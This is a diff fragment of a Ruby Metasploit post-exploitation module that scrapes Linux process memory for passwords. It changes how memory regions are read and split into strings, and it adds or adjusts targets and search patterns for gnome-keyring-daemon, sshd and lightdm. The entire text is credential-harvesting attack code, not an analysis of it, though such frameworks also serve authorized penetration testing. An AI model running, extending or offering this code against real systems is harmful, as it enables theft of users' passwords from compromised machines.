@@ -149,27 +149,44 @@ class MetasploitModule < Msf::Post
 
     lines = mem_data.split("\n")
     updated_regions = mem_regions.clone
-    mem_regions.each do |region|
-      address = region['start']
-      addr_line = lines.select { |line| line.start_with?(address.to_s(16)) }
-      next if addr_line.empty?
+    mem_regions.each_with_index do |region, index|
+      next if index == 0
 
-      addr_line = addr_line.first
+      first_addr = mem_regions[index - 1]['start']
+      curr_addr = region['start']
+      first_addr = first_addr.to_s(16)
+      curr_addr = curr_addr.to_s(16)
+      first_index = lines.index { |line| line.start_with?(first_addr) }
+      curr_index = lines.index { |line| line.start_with?(curr_addr) }
+      next if first_index.nil? || curr_index.nil?
 
-      index = lines.index(addr_line)
-      next if index.nil?
-      next if lines[index + 1].nil?
+      between_vals = lines.values_at(first_index + 1...curr_index)
+      between_vals = between_vals.select { |line| line.include?('00000000 00:00 0') }
+      if between_vals.empty? && !mem_regions.last == region
+        next
+      elsif between_vals.empty? && mem_regions.last == region
+        adj_region = lines[curr_index + 1]
+        return updated_regions if adj_region.nil?
 
-      # Password may be in next memory region if
-      # match is found near end of previous region
-      addr_line = lines[index + 1]
-      addresses = addr_line.split&.first
-      start_addr, end_addr = addresses.split('-')
-      start_addr = start_addr.to_i(16)
-      end_addr = end_addr.to_i(16)
+        address = adj_region.split&.first
+        start_addr, end_addr = address.split('-')
+        start_addr = start_addr.to_i(16)
+        end_addr = end_addr.to_i(16)
 
-      length = end_addr - start_addr
-      updated_regions << { 'start' => start_addr, 'length' => length }
+        length = end_addr - start_addr
+        updated_regions << { 'start' => start_addr, 'length' => length }
+        return updated_regions
+      end
+
+      between_vals.each do |addr_line|
+        addresses = addr_line.split&.first
+        start_addr, end_addr = addresses.split('-')
+        start_addr = start_addr.to_i(16)
+        end_addr = end_addr.to_i(16)
+
+        length = end_addr - start_addr
+        updated_regions << { 'start' => start_addr, 'length' => length }
+      end
     end
 
     updated_regions
@@ -182,17 +199,11 @@ class MetasploitModule < Msf::Post
 
     while curr_addr < max_addr
       data = mem_read(pid, curr_addr, 1000)
-      if data.gsub("\x00", '').empty?
-        curr_addr += 800
-        next
-      end
-
-      lines << data.split("\x00")
+      lines << data.split(/[^[:print:]]/)
       lines = lines.flatten
       curr_addr += 800
     end
 
-    lines.each { |line| line.gsub!(/[^[:print:]]/, '') }
     lines.reject! { |line| line.length < 5 }
     lines
   end
@@ -236,7 +247,8 @@ class MetasploitModule < Msf::Post
         'name' => 'gnome-keyring-daemon',
         'needles' => [
           '^+libgck\\-1.so\\.0$',
-          'libgcrypt\\.so\\..+$'
+          'libgcrypt\\.so\\..+$',
+          'linux-vdso\\.so\\.1$'
         ],
         'pid' => nil
       },
@@ -256,9 +268,16 @@ class MetasploitModule < Msf::Post
         'pid' => nil
       },
       {
-        'name' => 'sshd:',
+        'name' => 'sshd',
         'needles' => [
           '^sudo.+'
+        ],
+        'pid' => nil
+      },
+      {
+        'name' => 'lightdm',
+        'needles' => [
+          '^_pammodutil_getspnam_'
         ],
         'pid' => nil
       }
